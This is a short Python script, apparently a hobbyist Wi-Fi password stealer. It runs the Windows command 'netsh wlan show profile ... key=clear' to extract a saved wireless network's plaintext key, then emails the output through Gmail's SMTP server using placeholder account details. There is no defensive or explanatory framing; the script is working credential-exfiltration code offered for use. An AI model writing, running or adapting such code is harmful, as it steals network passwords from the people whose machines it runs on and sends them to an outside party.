from distutils.cmd import Command
from http import server
import subprocess, smtplib
from unittest import result


def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = 'netsh wlan show profile Wifi Name key=clear'
result= subprocess.check_output(command,shell=True)
#print(result)
send_mail('Your email','Your password', result)



